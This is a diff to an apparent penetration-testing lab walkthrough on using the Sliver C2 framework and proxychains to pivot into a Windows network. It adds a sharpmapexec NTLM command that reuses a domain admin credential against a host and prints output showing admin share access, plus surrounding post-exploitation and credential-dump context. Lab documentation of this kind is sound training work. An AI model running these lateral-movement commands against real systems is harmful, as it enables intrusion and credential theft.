@@ -384,9 +384,9 @@ jeff@kali:~$ tail /etc/proxychains.conf
 socks5  127.0.0.1 1081
                
                
-============================================================================================================================================
-PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot into the network '192.168.1.0/24'
-============================================================================================================================================
+=====================================================================================================================================================
+PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot into and attack the network '192.168.1.0/24'
+=====================================================================================================================================================
 
 without using Proxychains and the SLIVER tunnel, the network traffic is filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -457,10 +457,10 @@ C:\>exit
 
 
 ============================================================================================================================================
-Other - Post-exploitation modules 
+PoC - Step 8 - Use the SLIVER post-exploitation modules and extensions to pivot into and attack the network '192.168.1.0/24'
 ============================================================================================================================================
 
-There are many post-exploitation modules available with the Metasploit C2 framework.
+There are many post-exploitation modules available with the SLIVER C2 framework.
 
 Below are some examples of post-exploitation commands and modules:
 
@@ -677,6 +677,32 @@ Sub Commands:
 [*] Active session BOILING_LIVER (12d24a56)
 
 
+[server] sliver (BOILING_LIVER) > sharpmapexec ntlm smb /user:chuck.norris.adm /password:<SNIP> /domain:company /computername:192.168.1.167 /m:shares
+
+[*] sharpmapexec output:
+ntlmsmb
+------------------
+[*] User:   chuck.norris.adm
+[*] domain: company
+[*] secret: <SNIP>
+
+[*] Checking 192.168.13.125
+[*] SMB Versions:   [+]SMBv1 [+]SMBv2(0x0202) [+]SMBv2(0x0210) [+]SMBv3(0x0300) [+]SMBv3(0x0302) [-]SMBv3(0x0311)
+[*] SMBv1  Signing: [-]Signing Not Required
+[*] SMBv2+ Signing: [+]Signing Required
+[*] OS Version:     COMPANY - 10.0.14393
+  [+] Local Admin on 192.168.1.167
+    [*] Listing shares on 192.168.1.167
+--- Accessible Shares ---
+    [+]ADMIN$
+    [+]C$
+--- No Access ---
+    [-]IPC$
+    [-]NETLOGON
+    [-]SYSVOL
+
+
+
 [server] sliver (BOILING_LIVER) > ps
 
  Pid     Ppid    Owner                          Arch     Executable                                     Session 
@@ -784,3 +810,6 @@ luid 678126503
         == DPAPI [286b63a7]==
                 luid 678126503
 <SNIP>
+
+
+
